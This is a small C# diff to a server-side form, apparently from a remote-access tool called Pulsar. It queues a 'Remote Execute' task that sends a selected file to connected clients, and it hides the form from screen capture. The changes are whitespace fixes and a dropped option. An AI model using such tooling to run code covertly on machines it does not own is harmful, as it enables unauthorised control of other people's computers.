@@ -18,7 +18,7 @@ namespace Pulsar.Server.Forms
         {
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
         }
 
         private void FrmTaskExecute_Load(object sender, EventArgs e)
@@ -31,8 +31,7 @@ namespace Pulsar.Server.Forms
             FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
             if (frm != null)
             {
-                bool newClientsOnly = chkNewClientsOnly.Checked;
-                frm.AddTask("Remote Execute", FPTextBox.Text, "", newClientsOnly);
+                frm.AddTask("Remote Execute", FPTextBox.Text, "");
             }
         }
 
@@ -42,7 +41,7 @@ namespace Pulsar.Server.Forms
             using (OpenFileDialog openFileDialog = new OpenFileDialog())
             {
                 openFileDialog.Title = "Select a File";
-                openFileDialog.Filter = "All Files (*.*)|*.*"; 
+                openFileDialog.Filter = "All Files (*.*)|*.*";
                 if (openFileDialog.ShowDialog() == DialogResult.OK)
                 {
                     FPTextBox.Text = openFileDialog.FileName;
